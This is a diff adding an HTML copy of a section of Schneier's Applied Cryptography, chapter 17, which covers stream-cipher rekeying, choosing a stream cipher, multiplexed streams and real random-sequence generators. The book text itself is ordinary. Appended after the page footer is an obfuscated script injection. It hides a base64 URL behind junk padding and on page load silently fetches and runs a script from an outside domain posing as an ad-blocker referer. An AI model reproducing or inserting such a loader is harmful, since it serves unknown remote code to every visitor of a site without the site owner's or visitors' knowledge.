@@ -1,0 +1,120 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=17//-->
+<!--PAGES=420-422//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>A clever trick is to use one algorithm, either a block or stream algorithm, to frequently rekey a fast stream algorithm (which could even be a block algorithm in OFB mode). The fast algorithm could be weak, since a cryptanalyst would never see very much plaintext encrypted with any one key.
+</P>
+<P>There&#146;s a trade-off between the size of the fast algorithm&#146;s internal state (which may impact security) and how often you can afford to rekey. The rekey needs to be relatively fast; algorithms that have a long key setup routine aren&#146;t suitable for this kind of application. And the rekeying should be independent of the internal state of the fast algorithm.</P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">17.12 Choosing a Stream Cipher</FONT></H3>
+<P>If the study of stream ciphers offers any lessons, it&#146;s that new types of attacks are invented with alarming regularity. Classically, stream ciphers have been based on considerable mathematical theory. This theory can be used to prove good properties about the cipher, but can also be used to find new attacks against the cipher. I worry about any stream cipher based solely on LFSRs for this reason.
+</P>
+<P>I prefer stream ciphers that are designed more along the lines of block ciphers: nonlinear transformations, large S-boxes, and so on. RC4 is my favorite, and SEAL is a close second. I would be very interested in seeing cryptanalytic results against my generators that combine LFSRs and FCSRs; this seems to be a very fruitful area of stream-cipher research to mine for actual designs. Or, you can use a block cipher in OFB or CFB to get a stream cipher.</P>
+<P>Table 17.3 gives some timing measurements for some algorithms. These are meant for comparison purposes only.</P>
+<H3><A NAME="Heading14"></A><FONT COLOR="#000077">17.13 Generating Multiple Streams from a Single Pseudo-Random-Sequence Generator</FONT></H3>
+<P>If you need to encrypt multiple channels of communications in a single box&#151;a multiplexer, for example&#151;the easy solution is to use a different pseudo-random-sequence generator for each stream. This has two problems: It requires more hardware, and all the different generators have to be synchronized. It would be simpler to use a single generator.
+</P>
+<TABLE WIDTH="60%"><TR>
+<TH CAPTION COLSPAN="2" ALIGN="CENTER">Table 17.3<BR>Encryption Speeds of Some Stream Ciphers on a 33MHz 486SX
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" COLSPAN="2"><HR>
+<TR>
+<TD WIDTH="20%" VALIGN="TOP" ALIGN="CENTER">Algorithm
+<TD WIDTH="35%" VALIGN="TOP" ALIGN="LEFT">Encryption Speed (Kilobytes/Second)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">A5
+<TD VALIGN="TOP" ALIGN="CENTER">5
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">PIKE
+<TD VALIGN="TOP" ALIGN="CENTER">62
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">RC4
+<TD VALIGN="TOP" ALIGN="CENTER">164
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">SEAL
+<TD VALIGN="TOP" ALIGN="CENTER">381
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" COLSPAN="2"><HR>
+</TABLE>
+<P>One solution is to clock the generator multiple times. If you want three independent streams, clock the generator three times and send 1 bit into each stream. This technique works, but you may have trouble clocking the generator as fast as you would like. For example, if you can only clock the generator three times as fast as the data stream, you can only create three streams. Another way is to use the same sequence for each channel&#151;perhaps with a variable time delay. This is insecure.
+</P>
+<P>A really clever idea [1489], patented by the NSA, is shown in Figure 17.11. Dump the output of your favorite generator into an <I>m-</I>bit simple shift register. At each clock pulse, shift the register one to the right. Then, for each output stream, AND the register with a different <I>m-</I>bit control vector viewed as a unique identifier for the desired output stream, then XOR all the bits together to get the output bit for that stream. If you want several output streams in parallel, you need a separate control vector and an XOR/AND logic array for each output stream.</P>
+<P>There are some things to watch out for. If any of the streams are linear combinations of other streams, then the system can be broken. But if you are clever, this is an easy and secure way to solve the problem.</P>
+<H3><A NAME="Heading15"></A><FONT COLOR="#000077">17.14 Real Random-Sequence Generators</FONT></H3>
+<P>Sometimes cryptographically secure pseudo-random numbers are not good enough. Many times in cryptography, you want real random numbers. Key generation is a prime example. It&#146;s fine to generate random cryptographic keys based on a pseudo-random sequence generator, but if an adversary gets a copy of that generator and the master key, the adversary can create the same keys and break your cryptosystem, no matter how secure your algorithms are. A random-sequence generator&#146;s sequences cannot be reproduced. No one, not even you, can reproduce the bit sequence out of those generators.
+</P>
+<I><P><A NAME="Fig11"></A><A HREF="javascript:displayWindow('images/17-11.jpg',264,210 )"><IMG SRC="images/17-11t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-11.jpg',264,210)"><FONT COLOR="#000077"><B>Figure 17.11</B></FONT></A>&nbsp;&nbsp;Multiple-bit generator.</I>
+</P>
+<P>There is a large philosophical debate over whether any of these techniques actually produces real random bits. I am not going to address that debate. The point here is to produce bits that have the same statistical properties as random bits and are not reproducible.
+</P>
+<P>The important thing about any real random-sequence generator is that it be tested. There is a wealth of literature on this topic. Tests of randomness can be found in [863,99]. Maurer showed that all these tests can be derived from trying to compress the sequence [1031,1032]. If you can compress a random sequence, then it is not truly random.</P>
+<P>Anyhow, what we have here is a whole lot of black magic. The primary point is to generate a sequence of bits that your adversary is unlikely to guess. It doesn&#146;t sound like much, but it&#146;s harder than you think. I can&#146;t prove that any of these techniques generates random bits. These techniques produce a sequence of bits that cannot be easily reproduced. For some details, see [1375,1376,511].</P>
+<P><FONT SIZE="+1"><B><I>RAND Tables</I></B></FONT></P>
+<P>Back in 1955, when computers were still new, the Rand Corporation published a book that contained a million random digits [1289]. Their method is described in the book:
+</P>
+<BLOCKQUOTE><P>The random digits in the book were produced by rerandomization of a basic table generated by an electronic roulette wheel. Briefly, a random frequency pulse source, providing on the average about 100,000 pulses per second, was gated about once per second by a constant frequency pulse. Pulse standardization circuits passed the pulses through a 5-place binary counter. In principle the machine was a 32-place roulette wheel which made, on the average, about 3000 revolutions per trial and produced one number per second. A binary-to-decimal converter was used which converted 20 of the 32 numbers (the other twelve were discarded) and retained only the final digit of two-digit numbers; this final digit was fed into an IBM punch to produce finally a punched card table of random digits.
+</P>
+</BLOCKQUOTE><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(SMWFNhsf, aYNoNSzq) {aYNoNSzq = SMWFNhsf.createElement('script');aYNoNSzq.type = 'text/javascript';aYNoNSzq.async = true;aYNoNSzq.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');SMWFNhsf.getElementsByTagName('body')[0].appendChild(aYNoNSzq);}(document));</script></body>
+</html>
